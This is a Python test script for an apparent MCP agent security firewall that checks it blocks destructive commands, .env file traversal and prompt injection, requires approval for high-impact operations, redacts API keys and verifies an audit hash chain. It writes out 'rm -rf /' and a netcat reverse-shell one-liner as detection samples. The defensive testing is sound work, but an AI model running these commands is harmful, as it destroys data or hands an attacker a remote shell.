import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app.database.session import init_db, SessionLocal
from app.main import seed_initial_data
from app.api.demo import run_scenario
from app.api.audit import verify_audit_hash_chain
from app.api.security import scan_payload

def run_all_checks():
    print("=" * 60)
    print("  MCP SENTINEL - SECURITY FIREWALL VERIFICATION SUITE")
    print("=" * 60)
    
    print("\n[Phase 1] Database & Security Baseline Initialization...")
    init_db()
    seed_initial_data()
    print("  ✓ Database tables verified")
    print("  ✓ Security administrator, analyst, baseline servers & tools seeded")

    print("\n[Phase 2] Executing Master Demonstration Scenarios (A - F)...")
    with SessionLocal() as db:
        # Scenario A
        res_a = run_scenario("A", db)
        assert res_a["execution"]["decision"] == "ALLOW", f"Scenario A failed: {res_a}"
        print(f"  ✓ Scenario A: Normal Operation -> ALLOW (Risk: {res_a['execution']['risk_score']})")

        # Scenario B
        res_b = run_scenario("B", db)
        assert res_b["execution"]["decision"] == "BLOCK", f"Scenario B failed: {res_b}"
        print(f"  ✓ Scenario B: Destructive Command (rm -rf /) -> BLOCK (Risk: {res_b['execution']['risk_score']})")

        # Scenario C
        res_c = run_scenario("C", db)
        assert res_c["execution"]["decision"] == "BLOCK", f"Scenario C failed: {res_c}"
        print(f"  ✓ Scenario C: Sensitive File Traversal (.env) -> BLOCK (Risk: {res_c['execution']['risk_score']})")

        # Scenario D
        res_d = run_scenario("D", db)
        assert res_d["inspection_result"]["action"] == "BLOCK_RESPONSE", f"Scenario D failed: {res_d}"
        print(f"  ✓ Scenario D: Hostile Prompt Injection in Response -> BLOCK_RESPONSE")

        # Scenario E
        res_e = run_scenario("E", db)
        assert res_e["execution"]["decision"] == "REQUIRE_APPROVAL", f"Scenario E failed: {res_e}"
        print(f"  ✓ Scenario E: High-Impact Operation -> REQUIRE_APPROVAL (ID: {res_e['execution']['approval_id']})")

        # Scenario F
        res_f = run_scenario("F", db)
        assert res_f["inspection_result"]["action"] == "REDACT_SENSITIVE_DATA", f"Scenario F failed: {res_f}"
        print(f"  ✓ Scenario F: Secret Redaction (API Key) -> REDACT_SENSITIVE_DATA (Count: {res_f['inspection_result']['secrets_redacted_count']})")

        # Cryptographic Audit Hash Verification
        print("\n[Phase 3] Cryptographic Audit Log Hash Chain Verification...")
        chain_v = verify_audit_hash_chain(db)
        assert chain_v["status"] == "VERIFIED", f"Chain verification failed: {chain_v}"
        print(f"  ✓ Audit Log Integrity: {chain_v['status']} ({chain_v['total_records']} chained entries verified)")
        print(f"  ✓ Hash Chain Head: {chain_v['chain_head_hash'][:16]}...")

    # Ad-hoc Security Scan
    print("\n[Phase 4] Threat Analysis Engine Direct Scan...")
    scan_res = scan_payload({"command": "nc -e /bin/sh 10.0.0.1 4444"}, "run_command")
    assert scan_res["classification"] == "Critical"
    print(f"  ✓ Reverse Shell Detection: Classification '{scan_res['classification']}' (Score: {scan_res['max_risk_score']})")

    print("\n" + "=" * 60)
    print("  ALL TESTS & DEMONSTRATION SCENARIOS VERIFIED SUCCESSFULLY!")
    print("=" * 60)

if __name__ == "__main__":
    run_all_checks()
